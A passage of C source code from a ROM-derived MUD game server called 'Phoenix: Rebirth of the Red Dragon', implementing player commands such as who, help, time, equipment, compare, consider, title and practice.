    sprintf( buf, "{Bfor {C%-3d {BHRs{x", paf->duration );
      send_to_char( buf, ch );
     }
    send_to_char( "\n\r", ch );
    paf_last = paf;
	}
    }
    else 
    send_to_char("\n\r{BYou are not affected by any spells.{x\n\r",ch);
    return;
}



char *	const	day_name	[] =
{
    "the Moon", "the Bull", "Deception", "Thunder", "Freedom",
    "the Great Gods", "the Sun"
};

char *	const	month_name	[] =
{
    "Winter", "the Winter Wolf", "the Frost Giant", "the Old Forces",
    "the Grand Struggle", "the Spring", "Nature", "Futility", "the Dragon",
    "the Sun", "the Heat", "the Battle", "the Dark Shades", "the Shadows",
    "the Long Shadows", "the Ancient Darkness", "the Great Evil"
};

void do_time( CHAR_DATA *ch, char *argument )
{
    extern char str_boot_time[];
    char buf[MAX_STRING_LENGTH];
    char *suf;
    int day;

    day     = time_info.day + 1;

         if ( day > 4 && day <  20 ) suf = "th";
    else if ( day % 10 ==  1       ) suf = "st";
    else if ( day % 10 ==  2       ) suf = "nd";
    else if ( day % 10 ==  3       ) suf = "rd";
    else                             suf = "th";

    sprintf( buf,"\n\r{cIt is {C%d{c:00 {c%s\n\r{cOn the Day of {C%s\n\r{cWhich is the {C%d{c%s Day of the Month of {C%s{c.{x\n\r",
	(time_info.hour % 12 == 0) ? 12 : time_info.hour %12,
	time_info.hour >= 12 ? "pm" : "am",
	day_name[day % 7],
	day, suf,
	month_name[time_info.month]);
    send_to_char(buf,ch);
    sprintf(buf,"\n\r\n\r{wPhoenix: {rRebirth of the{R Red {rDragon{x started up at %s\n\r{wThe system time is{x %s\n\r",
	str_boot_time,(char *) ctime( &current_time ));

    send_to_char( buf, ch );
    return;
}

void do_help( CHAR_DATA *ch, char *argument )
{
    HELP_DATA *pHelp;
    BUFFER *output;
    bool found = FALSE;
    char argall[MAX_INPUT_LENGTH];
    char argone[MAX_INPUT_LENGTH];
    char nohelp[MAX_STRING_LENGTH];
    int level;
    unsigned long i;
    char * dynamicBuf=0;
    char    buf[MAX_STRING_LENGTH];
    char ** ar=0;
    char ** lines=0;
    char * textToInsert=0;

    if(skill_lookup(argument)>0)
        do_slookup(ch, argument);

    output = new_buf();

    strcpy(nohelp, argument);

    if ( argument[0] == '\0' )
	   argument = "summary";

    /* this parts handles help a b so that it returns help 'a b' */
    argall[0] = '\0';
    
    while (argument[0] != '\0' )
    {
    	argument = one_argument(argument,argone);
    	if (argall[0] != '\0')
    	    strcat(argall," ");
    	strcat(argall,argone);
    }

    for ( pHelp = help_first; pHelp != NULL; pHelp = pHelp->next )
    {
        level = (pHelp->level < 0) ? -1 * pHelp->level - 1 : pHelp->level;

        if (level > ch->level )
	       continue;

	    if ( is_name( argall, pHelp->keyword ) )
	    {
	       /* add seperator if found */
	        if (found)
		        add_buf(output,"\n\r\n\r\n\r");
		    else
		        add_buf(output,"\n\r\n\r");
		  
	        if ( pHelp->level >= 0 && str_cmp( argall, "imotd" ) && pHelp->level <= 499 && pHelp->level >= 0 )
	        {
                for(dynamicBuf=strdup("{c/-"),i=0;i<=strlen(pHelp->keyword);dynamicBuf=strchrappend(dynamicBuf, '-'),i++)
                ;
                dynamicBuf=strappend(dynamicBuf, "\\{x\n\r");
	            add_buf(output, dynamicBuf);
	            dynamicBuf = strfree(dynamicBuf);
	            sprintf(buf, "{c| {W%s {c|{x\n\r", pHelp->keyword);
                add_buf(output, buf);
	        }

            add_buf(output, "{c+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+{x\n\r");
            add_buf(output, "{c|                                                                             |{x\n\r");

            lines = strchrexplode(pHelp->text, '\n');
            for(ar=lines;ar && *ar;ar++)
            {
                textToInsert = strdup(*ar);
                if(strstr(textToInsert, "Syntax: "))
                    textToInsert = strstrrep(textToInsert, "Syntax: ", "{WSyntax: {c");
                 if(strstr(textToInsert, "Also see help for: "))
                    textToInsert = strstrrep(textToInsert, "Also see help for: ", "{WAlso see help for: {C");
                
                for(dynamicBuf=strdup("{c| {x"),dynamicBuf=strappend(dynamicBuf, textToInsert),i=2+strlen(strip_color(textToInsert));i<=77;dynamicBuf=strchrappend(dynamicBuf, ' '),i++)
                ;
                if(ar!=lines)
                    dynamicBuf=strchrappend(dynamicBuf, ' ');
                dynamicBuf=strappend(dynamicBuf, "{c|{x\n\r");
	            add_buf(output, dynamicBuf);
	            dynamicBuf = strfree(dynamicBuf);
	            
	            textToInsert = strfree(textToInsert);
            }
            lines = array_free(lines);

            //add_buf(output, "{c|                                                                             |{x\n\r");
            add_buf(output, "{c+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+{x\n\r");

            found = TRUE;            
            
            /* small hack :) */
            if(ch->desc != NULL && ch->desc->connected != CON_PLAYING && ch->desc->connected != CON_GEN_GROUPS)
                break;
	    }
    }

    if(!found)
    {
    	send_to_char("No help on that word.\n\r", ch);
        append_file( ch, HELP_FILE, nohelp );
    }
    else
	    page_to_char(buf_string(output),ch);
	    
    free_buf(output);    
}

void do_scoreswap( CHAR_DATA * ch, char * argument )
{
    if(!IS_LEGEND(ch))
        return;
    
    if(ch->pcdata->casterScore)
    {
        ch->pcdata->casterScore = FALSE;
        send_to_char("\n\r{GYou will now see the {RWarrior{G score.{x\n\r", ch);
    }
    else
    {
        ch->pcdata->casterScore = TRUE;
        send_to_char("\n\r{GYou will now see the {BCaster{G score.{x\n\r", ch);
    }
}

void do_who( CHAR_DATA *ch, char *argument )
{
  char buf[MAX_STRING_LENGTH];
  DESCRIPTOR_DATA *d;
  CLAN_DATA *pClan = NULL;
  char name[ MAX_INPUT_LENGTH ] = "";
  extern char str_boot_time[];
  int iRace;
  int nNumber;
  int nMatch;
  int nImm;
  int len2, len1, subtract, difference;
  bool rgfRace[MAX_PC_RACE];
  bool fRaceRestrict = FALSE;
  bool fImmortalOnly = FALSE;
  bool fNameRestrict = FALSE;
  bool fDPITOnly = FALSE;
  char ** lines=0;
  char ** ar=0;
  int numLines=-1, targetLine=-1, curLine=-1;
  char * tempString=0;
  
  sprintf (buf, "\n\r       {rPhoenix{W: Rebirth of the {RRed {rDragon{x\n\r\n\r");
  send_to_char(buf, ch);
  send_to_char( "\n\r", ch );

  /*
   * Set default arguments.
   */
  nImm           = 0;
  
  for ( iRace = 0; iRace < MAX_PC_RACE; iRace++ )
    rgfRace[iRace] = FALSE;

  /*
   * Parse arguments.
   */

  nNumber = 0;

  for ( ;; )
    {
    char arg[MAX_STRING_LENGTH];

    argument = one_argument( argument, arg );
    if ( arg[0] == '\0' )
      break;
  
 if (!str_prefix(arg,"immortals"))
     fImmortalOnly = TRUE;
      else
      {
       if (!str_prefix(arg,"dragonpit"))
         fDPITOnly = TRUE;
        else
        {
          iRace = race_lookup(arg);
          if (iRace == 0 || iRace >= MAX_PC_RACE)
            {
                strcpy( name, arg );
                fNameRestrict = TRUE;
            }
          else
            {
            fRaceRestrict = TRUE;
            rgfRace[iRace] = TRUE;
            }
          }
      }
    }
  /*
   * Now show matching chars.
   */
  nMatch = 0;
  buf[0] = '\0';
  for ( d = descriptor_list; d; d = d->next )
    {
    CHAR_DATA *wch;
    char const *race;
    char const *class;
    /*
     * Check for match against restrictions.
     */
    if ( (d->connected != CON_PLAYING && d->connected != CON_NOTE_TO && d->connected != CON_NOTE_SUBJECT && d->connected != CON_NOTE_EXPIRE &&
          d->connected != CON_NOTE_TEXT && d->connected != CON_NOTE_FINISH) || !can_see( ch, d->character ) )
      continue;
      



    wch   = ( d->original != NULL ) ? d->original : d->character;

    if ( !can_see( ch, wch ) )
      continue;


    if ((wch->clan != 0)
    && (IS_SET(wch->comm, COMM_CLANSHOW)))
      pClan = get_clan_index(wch->clan);
    else
      pClan = NULL;

    if (( fImmortalOnly  && wch->level < LEVEL_IMMORTAL) 
    || ( fRaceRestrict && !rgfRace[wch->race] )
    || ( fNameRestrict && (str_prefix( name, wch->name ) && !(pClan && !str_prefix(name, pClan->name) )))
    || ( fDPITOnly && !IS_SET(wch->pact, PLR_DRAGONPIT))
    || (IS_NPC(wch)))
      continue;

    nMatch++;
    if ( wch->level > LEVEL_HERO )
      nImm++;

    /*
     * Figure out what to print for class.
     */

         race  = pc_race_table[wch->race].who_name;
         class = class_table[wch->class].who_name;
    /*
     * Format it up.
     */

    if ( wch->level <= LEVEL_HERO )
    {
        if(IS_LEGEND(wch))
        {
            //if(wch->level==LEVEL_HERO)
            //    sprintf( buf, "{c[  {M{{{{{YLegend!{M}{c  ]{x ");
            //else
                sprintf( buf, "{c[ {M%3d  {YLegend {c]{x ", wch->level);     
        }
        else
           sprintf( buf, "{c[ {M%3d {W%s {c%s ]{x ", wch->level, race,class_table[wch->class].who_name);     
    }
    else
      {
      if (wch->pcdata->job == NULL)
        wch->pcdata->job=str_dup( "IMMORTAL" );
	
    len1=strlen(wch->pcdata->job);
	if(len1>12)
	subtract=(len1-12); 
else
subtract=0;        
len2=strlen_wo_col(wch->pcdata->job);
	len1-=subtract;
	len2-=subtract;
	difference=len1-len2;	// difference is now how much to add
	difference+=12;
	if(!str_cmp(wch->name, "Sembiance"))
	sprintf(buf, "{c[{W%*s{c]{x ", difference, wch->pcdata->job);
	else
	sprintf(buf, "{c[{W%*s {c]{x ", difference, wch->pcdata->job);
      }

    if (pClan)
      {
       
       int len = 4 + strlen(pClan->who_name) - strlen_wo_col(pClan->who_name);
        sprintf (buf + strlen(buf), "{w[%-*s{w]{w ",len,pClan->who_name);

       if (IS_SET(wch->pact, PLR_CLAN_LEADER))
            sprintf (buf + strlen(buf), "{C[MCL] ");
      }
      
      if(IS_HARDCORE(wch))
        sprintf(buf + strlen(buf), "{Y({RHC{Y) ");
      
      if(IS_REMORT(wch))
      {     
            if(!IS_LEGEND(wch))
                sprintf(buf + strlen(buf), "{r({wR{r) ");
      }
      numLines++;
      if(wch->level<LEVEL_HERO && ((current_time - wch->logon)/60 >= 15) && !IS_SET(wch->comm, COMM_AFK))
        {
            sprintf(buf + strlen(buf), "77A7D7D7I7C7T77");
             targetLine = numLines;
        }

    if ( wch->invis_level > 10 )
      sprintf( buf + strlen( buf ), "{D(W{w:{W%d{D) ",wch->invis_level);
    if ( wch->incog_level > 10 )
      sprintf( buf + strlen( buf ), "{D(I{w:{W%d{D) ",wch->incog_level);
    if ( IS_SET( wch->comm, COMM_AFK ) )
      strcat( buf, "{r<{WAFK{r>{x " );
    if ( IS_QUESTOR( wch ) )
      strcat( buf, "{c<{wQUEST{c> " );
    if ( IS_SET( wch->comm, COMM_ICON ) )
      strcat( buf, "{b({WICON{b){x " );
    if ( IS_SET( wch->pact, PLR_THIEF ) )
      strcat( buf, "{r({DTHIEF{r){x " );
if ( IS_SET( wch->pact, PLR_JAIL ) )
      strcat( buf, "{D[{w|{YJAILBIRD{w|{D]{x " );

if (wch->who_name > 0 )
  {
sprintf( buf + strlen( buf ), "{x%s{x%s{x\n\r", wch->who_name, wch->pcdata->title );
  }
else
  {
sprintf( buf + strlen( buf ), "{x%s%s{x\n\r", wch->name,wch->pcdata->title );
  }
    lines = array_append(lines, buf);
   // send_to_char( buf, ch );
    }
    
    
    // process our lines for addict
    for(ar=lines,curLine=0;ar && *ar;curLine++,ar++)
    {
        tempString = strdup(*ar);
        
        if(targetLine==curLine)
            strstrrep(tempString, "77A7D7D7I7C7T77", "{w<{Caddict{w> ");
        else
            strstrstrip(tempString, "77A7D7D7I7C7T77");
    
        send_to_char(tempString, ch);
        
        tempString = strfree(tempString);
    }
    
    lines = array_free(lines);

/* This doesnt work Arioch, arg is out of scope. -- Rage

if (!str_prefix(arg,"dragonpit")
&& isdp == TRUE)
  {
  sprintf( buf, "\n\r{cThe DragonPIT has {R%d {cplayer%s and {ca Jackpot of {R%d{c.\n\r"
                "{cTime remaining for this DragonPIT{w: {R%d tick%s{c.\n\r",
                nMatch, nMatch > 1 ? "s" : "",
                jackpot,dptimer,dptimer > 1 ? "s" : "");
  send_to_char( buf, ch );
  return;
  }
else
*/
  {
  if (!str_cmp(ch->name, "Venus"))
    {
  sprintf( buf, "\n\r{cYou can see {R%d {cplayer%s{w, "
                "{cactivity peaked at {R%d {cplayers this session{w.\n\r"
                "{WPhoenix: RotRD {cwas busiest on {w%s {chosting {R%d {cplayers{w.\n\r"
                "{rRed Dragon {xhas been running since {W%s{x",
                nMatch, nMatch > 1 ? "s" : "",
                crm_players,
                date_atmp, atm_players, str_boot_time);
  send_to_char( buf, ch );
    }
  else
    {
  sprintf( buf, "\n\r{cYou can see {R%d {cplayer%s{w, "
                "{cactivity peaked at {R%d {cplayers this session{w.\n\r"
                "{WPhoenix: RotRD {cwas busiest on {w%s {chosting {R%d {cplayers{w.\n\r",
                nMatch, nMatch > 1 ? "s" : "",
                crm_players,
                date_atmp, atm_players);
  send_to_char( buf, ch );
    }
  return;
  }
}


void do_inventory( CHAR_DATA *ch, char *argument )
{
    send_to_char( "\n\r{cYou are carrying{w:{x\n\r", ch );
    show_list_to_char( ch->carrying, ch, TRUE, TRUE );
    return;
}


/* Old DO_EQUIPMENT  
void do_equipment( CHAR_DATA *ch, char *argument )
{
    OBJ_DATA *obj;
    int iWear;
    bool found;

    send_to_char( "\n\r{cYou are using{w:{x\n\r", ch );
    found = FALSE;
    for ( iWear = 0; iWear < MAX_WEAR; iWear++ )
    {
	if ( ( obj = get_eq_char( ch, iWear ) ) == NULL )
          {
          send_to_char( where_name[iWear], ch );
          send_to_char( "{D<{wnothing{D>{x\n\r", ch );
          continue;
          }

	send_to_char( where_name[iWear], ch );
	if ( can_see_obj( ch, obj ) )
	{
	    send_to_char( format_obj_to_char( obj, ch, TRUE, TRUE ), ch );
	    send_to_char( "\n\r", ch );
	}
	else
	{
	    send_to_char( "something.\n\r", ch );
	}
	found = TRUE;
    }

    return;
}
*/

/* new DO_EQUIPMENT adding in DUAL WIELD */
void do_equipment( CHAR_DATA *ch, char *argument )
{
    OBJ_DATA *obj;
    int iWear;

    send_to_char( "\n\r{cYou are using{w:{x\n\r", ch );
    for ( iWear = 0; iWear < MAX_WEAR; iWear++ )
    {
	if ( ( obj = get_eq_char( ch, iWear ) ) == NULL )
	  {
	  if ( ( iWear == WEAR_SHIELD
	  ||     iWear == WEAR_HOLD )
	  &&   get_eq_char( ch, WEAR_SECONDARY ) )
	    continue;
	  if ( iWear == WEAR_SECONDARY
	  && ( get_skill(ch,gsn_dualwield) <= 0
	  ||   get_eq_char( ch, WEAR_SHIELD )
	  ||   get_eq_char( ch, WEAR_HOLD ) ) )
	    continue;
	  send_to_char( where_name[iWear], ch );
	  send_to_char( "{D<{wnothing{D>{x\n\r", ch );
	  continue;
	  }	  
	send_to_char( where_name[iWear], ch );
	if ( can_see_obj( ch, obj ) )
	{
	    send_to_char( format_obj_to_char( obj, ch, TRUE,FALSE ), ch);
	    send_to_char( "\n\r", ch );
	}
	else
	{
	    send_to_char( "something.\n\r", ch );
	}
    }
    return;
}

void do_compare( CHAR_DATA *ch, char *argument )
{
    char arg1[MAX_INPUT_LENGTH];
    char arg2[MAX_INPUT_LENGTH];
    OBJ_DATA *obj1;
    OBJ_DATA *obj2;
    int value1;
    int value2;
    char *msg;

    argument = one_argument( argument, arg1 );
    argument = one_argument( argument, arg2 );

    if ( arg1[0] == '\0' )
    {
	send_to_char( "\n\r{cCompare what to what?{x\n\r", ch );
	return;
    }

    if ( ( obj1 = get_obj_carry( ch, arg1, ch ) ) == NULL )
    {
	send_to_char( "\n\r{RYou do {WNOT {Rhave that item{r.{x\n\r", ch );
	return;
    }

    if (arg2[0] == '\0')
    {
	for (obj2 = ch->carrying; obj2 != NULL; obj2 = obj2->next_content)
	{
	    if (obj2->wear_loc != WEAR_INVENTORY
	    &&  can_see_obj(ch,obj2)
	    &&  obj1->item_type == obj2->item_type
	    &&  (obj1->wear_flags & obj2->wear_flags & ITEM_TAKE) != 0 )
		break;
	}

	if (obj2 == NULL)
	{
	    send_to_char("\n\r{GYou aren't wearing anything comparable.{x\n\r",ch);
	    return;
	}
    } 

    else if ( (obj2 = get_obj_carry(ch,arg2,ch) ) == NULL )
    {
	send_to_char("\n\r{RYou do {WNOT{R have that item{r.{x\n\r",ch);
	return;
    }

    msg		= NULL;
    value1	= 0;
    value2	= 0;

    if ( obj1 == obj2 )
    {
	msg = "\n\r{cYou compare {C$p {cto itself.  It looks about the same.{x\n\r";
    }
    else if ( obj1->item_type != obj2->item_type )
    {
msg = "\n\r{RYou can {WNOT{R compare {r$p {Rand {W$P{r, {RTheir {WTYPEs{Rare dissimilar{r.{x\n\r";
    }
    else
    {
	switch ( obj1->item_type )
	{
	default:
  	    msg = "\n\r{RYou can {WNOT{R compare {r$p {Rand {W$P{r.{x\n\r";
	    break;

	case ITEM_ARMOR:
	    value1 = obj1->value[0] + obj1->value[1] + obj1->value[2] + obj1->value[3];
	    value2 = obj2->value[0] + obj2->value[1] + obj2->value[2] + obj2->value[3];
	    break;

	case ITEM_WEAPON:
	    if (obj1->pIndexData->new_format)
		value1 = (1 + obj1->value[2]) * obj1->value[1];
	    else
	    	value1 = obj1->value[1] + obj1->value[2];

	    if (obj2->pIndexData->new_format)
		value2 = (1 + obj2->value[2]) * obj2->value[1];
	    else
	    	value2 = obj2->value[1] + obj2->value[2];
	    break;
	}
    }

    if ( msg == NULL )
    {
	     if ( value1 == value2 ) msg = "\n\r{C$p {cand {W$P {clook about the same.{x\n\r";
	else if ( value1  > value2 ) msg = "\n\r{C$p {clooks better than {W$P{c.{x\n\r";
	else                         msg = "\n\r{C$p {clooks worse than {W$P{c.{x\n\r";
    }

    act( msg, ch, obj1, obj2, TO_CHAR );
    return;
}



void do_credits( CHAR_DATA *ch, char *argument )
{
    do_function(ch, &do_help, "diku" );
    return;
}

void do_where( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char arg[MAX_INPUT_LENGTH];
    CHAR_DATA *victim;
    DESCRIPTOR_DATA *d;
    bool found;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
    {

     if (ch->in_room->clanowner > 0)
       {
        send_to_char( "\n\r{RClan Halls prevent the use of WHERE.{x\n\r", ch );
        return;
       }      

  if (IS_SET(ch->comm, COMM_AFK))
    {
     send_to_char("AFK mode removed due to PLAYER INPUT. Type 'replay' to see tells.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_AFK);
    }

        send_to_char( "{cPlayers near you:\n\r{x", ch );
        found = FALSE;
        for ( d = descriptor_list; d; d = d->next )
        {
            if ( d->connected == CON_PLAYING
            && ( victim = d->character ) != NULL
            &&   !IS_NPC(victim)
            &&   victim->in_room != NULL
            &&   ( ( !IS_SET(victim->in_room->room_flags,ROOM_NOWHERE)
            &&   (is_room_owner(ch,victim->in_room)
            ||    !room_is_private(victim->in_room))
            &&   victim->in_room->area == ch->in_room->area )
                || ch->level >= LEVEL_IMMORTAL )
            &&   can_see( ch, victim ) 
            && !IS_AFFECTED(victim, AFF_HIDE))
            {
                found = TRUE;
                if ( ch->level >= MAX_LEVEL-391 )
                sprintf( buf, "{c%-18s [%3d][%c][%5d] %s\n\r{x",
                    victim->name, victim->level,
                    victim->fighting ? 'F' : ' ',
                    victim->in_room->vnum, victim->in_room->name );
                else if ( ch->level >= MAX_LEVEL-392 )
                sprintf( buf, "{c%-18s [%c][%5d] %s\n\r{x",
                    victim->name, victim->fighting ? 'F' : ' ',
                    victim->in_room->vnum, victim->in_room->name );
                else
                sprintf( buf, "{c%-28s %s\n\r{x",
                    victim->name, victim->in_room->name );
                send_to_char( buf, ch );
            }
        }
        if ( !found )
            send_to_char( "{yNone\n\r{x", ch );
    }
    else
    {
        found = FALSE;
        for ( victim = char_list; victim != NULL; victim = victim->next )
        {
            if ( ( ( victim->in_room != NULL
            &&   victim->in_room->area == ch->in_room->area
            &&   !IS_AFFECTED(victim, AFF_HIDE)
            &&   !IS_AFFECTED(victim, AFF_SNEAK) )
                || ch->level >= LEVEL_IMMORTAL )
            &&   can_see( ch, victim )
            &&   is_name( arg, victim->name ) 
            && !IS_AFFECTED(victim, AFF_HIDE))
            {
                found = TRUE;
                if ( ch->level >= MAX_LEVEL-391 )
                sprintf( buf, "{c%-18s [%3d][%c][%5d] %s\n\r{x",
                    victim->name, victim->level,
                    victim->fighting ? 'F' : ' ',
                    victim->in_room->vnum, victim->in_room->name );
                else if ( ch->level >= MAX_LEVEL-392 )
                sprintf( buf, "{c%-18s [%c][%5d] %s\n\r{x",
                    victim->name, victim->fighting ? 'F' : ' ',
                    victim->in_room->vnum, victim->in_room->name );
                else
                sprintf( buf, "%-28s %s\n\r",
                    PERS(victim, ch), victim->in_room->name );
                send_to_char( buf, ch );
                break;
            }
        }
        if ( !found )
            act( "You didn't find any $T.", ch, NULL, arg, TO_CHAR );
    }

    return;
}


void do_consider( CHAR_DATA *ch, char *argument )
{
    char arg[MAX_INPUT_LENGTH];
    CHAR_DATA *victim;
    int diff;
    int diff2;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
    {
	send_to_char( "\n\r{CConsider killing whom?{x\n\r", ch );
	return;
    }

    if ( ( victim = get_char_room( ch, arg ) ) == NULL )
    {
	send_to_char( "\n\r{RThey're not in here with you.{x\n\r", ch );
	return;
    }

    diff = (victim->hit) - (ch->hit);
    diff2 = victim->level - ch->level;

    if (ch->level <= 15)
      { 
       char *msg;
         if ( diff2 <= -10 ) msg = "\n\r{GYou can kill {W$N {Gnaked and weaponless.{x";
    else if ( diff2 <=  -5 ) msg = "\n\r{W$N {Bis no match for you.{x";
    else if ( diff2 <=  -2 ) msg = "\n\r{W$N {Rlooks like an easy kill.{x";
    else if ( diff2 <=   1 ) msg = "\n\r{cThe perfect match!{x";
    else if ( diff2 <=   4 ) msg = "\n\r{Y$N {Ysays 'Do you feel lucky, punk?'.{x";
    else if ( diff2 <=   9 ) msg = "\n\r{W$N {mlaughs at you mercilessly!{x";
    else                     msg = "\n\r{RDeath will thank you for your gift!{x";
 
    act( msg, ch, NULL, victim, TO_CHAR );
    return;
      }
    else
     {

    if (( diff >= -250 && diff <= 250 )
    && (diff2 >= -6) && (diff2 <= 6) )
      {
       char *msg;
         if ( diff <= -250 ) msg = "\n\r{GYou can kill {W$N {Gnaked and weaponless.{x";
    else if ( diff <= -200 ) msg = "\n\r{MYou can kill {W$N {Mwithout even breaking a sweat.{x";
    else if ( diff <= -150 ) msg = "\n\r{W$N {Bis no match for you.{x";
    else if ( diff <= -100 ) msg = "\n\r{W$N {Rlooks like an easy kill.{x";
    else if ( diff <= -50  ) msg = "\n\r{W$N {Cbetter say their prayers.{x";
    else if ( diff <=  0   ) msg = "\n\r{cThe perfect match!{x";
    else if ( diff <=  50  ) msg = "\n\r{Y$N {Ysays 'Do you feel lucky, punk?'.{x";
    else if ( diff <=  100 ) msg = "\n\r{gYou should think harder about engaging {W$N{g.{x";
    else if ( diff <=  150 ) msg = "\n\r{W$N {mlaughs at you mercilessly!{x";
    else if ( diff <=  200 ) msg = "\n\r{yYou better make your peace with your God first!{x";
    else if ( diff <=  250 ) msg = "\n\r{RDeath will thank you for your gift!{x";
    else msg = "\n\r{rNot even your mother will will be able to ID your corpse!{x";

    act( msg, ch, NULL, victim, TO_CHAR );
    return;
      }
    else
      {
       char *msg;
         if ( diff <= -4000 ) msg = "\n\r{GYou can kill {W$N {Gnaked and weaponless.{x";
    else if ( diff <= -3000 ) msg = "\n\r{MYou can kill {W$N {Mwithout even breaking a sweat.{x";
    else if ( diff <= -2000 ) msg = "\n\r{W$N {Bis no match for you.{x";
    else if ( diff <= -1000 ) msg = "\n\r{W$N {Rlooks like an easy kill.{x";
    else if ( diff <= -250  ) msg = "\n\r{W$N {Cbetter say their prayers.{x";
    else if ( diff <=  250  ) msg = "\n\r{cThe perfect match!{x";
    else if ( diff <=  1000 ) msg = "\n\r{Y$N {Ysays 'Do you feel lucky, punk?'.{x";
    else if ( diff <=  2000 ) msg = "\n\r{gYou should think harder about engaging {W$N{g.{x";
    else if ( diff <=  3000 ) msg = "\n\r{W$N {mlaughs at you mercilessly!{x";
    else if ( diff <=  4000 ) msg = "\n\r{yYou better make your peace with your God first!{x";
    else if ( diff <=  5000 ) msg = "\n\r{RDeath will thank you for your gift!{x";
    else msg = "\n\r{rNot even your mother will will be able to ID your corpse!{x";

    act( msg, ch, NULL, victim, TO_CHAR );
    return;
      }
   }
return;
}


void set_title( CHAR_DATA *ch, char *title )
{
    char buf[MAX_STRING_LENGTH];

    if ( IS_NPC(ch) )
    {
	bug( "Set_title: NPC.", 0 );
	return;
    }

    if ( title[0] != '.' && title[0] != ',' && title[0] != '!' && title[0] != '?' )
    {
	buf[0] = ' ';
	strcpy( buf+1, title );
    }
    else
    {
	strcpy( buf, title );
    }

    free_string( ch->pcdata->title );
    ch->pcdata->title = str_dup( buf );
    return;
}



void do_title( CHAR_DATA *ch, char *argument )
{
    if ( IS_NPC(ch) )
	return;
  
  if (IS_SET(ch->comm,COMM_NOTITLE))
    {  
     send_to_char("\n\r{WUntil you {Rgrow up{W, the {GTITLE{W command has been taken from you!{x\n\r",ch );
     return;
    }


    if ( argument[0] == '\0' )
    {
	send_to_char( "Change your title to what?\n\r", ch );
	return;
    }

   if (!IS_IMP(ch))
     {
      if ( strlen_wo_col(argument) > 45 )
	{ 
         send_to_char("To many actual letters. 45 max.\n\r", ch); 
         return; 
        }
     }

fix_player_text(ch, argument);
    smash_tilde( argument );
    set_title( ch, argument );
    send_to_char( "Ok.\n\r", ch );


}



void do_description( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];

    if ( argument[0] != '\0' )
    {
	buf[0] = '\0';
	smash_tilde( argument );

    	if (argument[0] == '-')
    	{
            int len;
            bool found = FALSE;
 
            if (ch->description == NULL || ch->description[0] == '\0')
            {
                send_to_char("No lines left to remove.\n\r",ch);
                return;
            }
	
  	    strcpy(buf,ch->description);
 
            for (len = strlen(buf); len > 0; len--)
            {
                if (buf[len] == '\r')
                {
                    if (!found)  /* back it up */
                    {
                        if (len > 0)
                            len--;
                        found = TRUE;
                    }
                    else /* found the second one */
                    {
                        buf[len + 1] = '\0';
			free_string(ch->description);
			ch->description = str_dup(buf);
			send_to_char( "Your description is:\n\r", ch );
			send_to_char( ch->description ? ch->description : 
			    "(None).\n\r", ch );
                        return;
                    }
                }
            }
            buf[0] = '\0';
	    free_string(ch->description);
	    ch->description = str_dup(buf);
	    send_to_char("Description cleared.\n\r",ch);
	    return;
        }
	if ( argument[0] == '+' )
	{
	    if ( ch->description != NULL )
		strcat( buf, ch->description );
	    argument++;
	    while ( isspace(*argument) )
		argument++;
	}

        if ( strlen(buf) >= 1024)
	{
	    send_to_char( "Description too long.\n\r", ch );
	    return;
	}

	strcat( buf, argument );
	strcat( buf, "\n\r" );
	free_string( ch->description );
	ch->description = str_dup( buf );
    }

    send_to_char( "Your description is:\n\r", ch );
    send_to_char( ch->description ? ch->description : "(None).\n\r", ch );
    return;
}



void do_report( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_INPUT_LENGTH];

    sprintf( buf,
	"You say 'I have %d/%d hp %d/%d mana %d/%d mv %d xp.'\n\r",
	ch->hit,  ch->max_hit,
	ch->mana, ch->max_mana,
	ch->move, ch->max_move,
	ch->exp   );

    send_to_char( buf, ch );

    sprintf( buf, "$n says 'I have %d/%d hp %d/%d mana %d/%d mv %d xp.'",
	ch->hit,  ch->max_hit,
	ch->mana, ch->max_mana,
	ch->move, ch->max_move,
	ch->exp   );

    act( buf, ch, NULL, NULL, TO_ROOM );

    return;
}



void do_practice( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    int sn;
    int i;
    bool trained;

    if ( IS_NPC(ch) )
	return;

    if ( argument[0] == '\0' )
    {
	int col;
      
	    send_to_char( "\n\r", ch );

	col    = 0;
	for ( sn = 0; sn < MAX_SKILL; sn++ )
	{
	    if ( skill_table[sn].name == NULL )
		break;

 
            if ( ch->pcdata->oldcl == -1 )
              {
              if ( ch->pcdata->learned[sn] < 1
              || skill_table[sn].skill_level[ch->class] > ch->level )
                continue;
              } 
            else
              {
              if ( ch->pcdata->learned[sn] < 1
              || ( skill_table[sn].skill_level[ch->class] > ch->level
              &&   skill_table[sn].skill_level[ch->pcdata->oldcl] > ch->level ) )
                continue;
              }
  
    sprintf( buf, "{D[{W%-18.18s{D]{D[{W%3d{c%%{D]{x  ",skill_table[sn].name, ch->pcdata->learned[sn] );

	    send_to_char( buf, ch );
	    if ( ++col % 3 == 0 )
		send_to_char( "\n\r", ch );
	}

	if ( col % 3 != 0 )
	    send_to_char( "\n\r", ch );

    sprintf(buf, "\n\r{GYou are also trained in: {Y");
    for(i=0,trained=FALSE;racechan_flags[i].name;i++)
    {
        if(IS_SET(ch->racechan, racechan_flags[i].bit))
        {
            trained = TRUE;
            strcat(buf, " ");
            strcat(buf, racechan_flags[i].name);
        }
    }
    if(trained)
    {
        strcat(buf, "{x\n\r");
        send_to_char(buf, ch);
    }

	sprintf( buf, "\n\r{RTrains{w {W%d    {RPractice{w: {W%d{x\n\r",ch->train,ch->practice );
	send_to_char( buf, ch );
    }
    else
    {
	CHAR_DATA *mob;
	int adept;

	if ( !IS_AWAKE(ch) )
	{
	    send_to_char( "In your dreams, or what?\n\r", ch );
	    return;
	}

	for ( mob = ch->in_room->people; mob != NULL; mob = mob->next_in_room )
	{
	    if ( IS_NPC(mob) && IS_SET(mob->act, ACT_PRACTICE) )
		break;
	}

	if ( mob == NULL )
	{
	    send_to_char( "You can't do that here.\n\r", ch );
	    return;
	}

	if ( ch->practice <= 0 )
	{
	    send_to_char( "You have no practice sessions left.\n\r", ch );
	    return;
	}

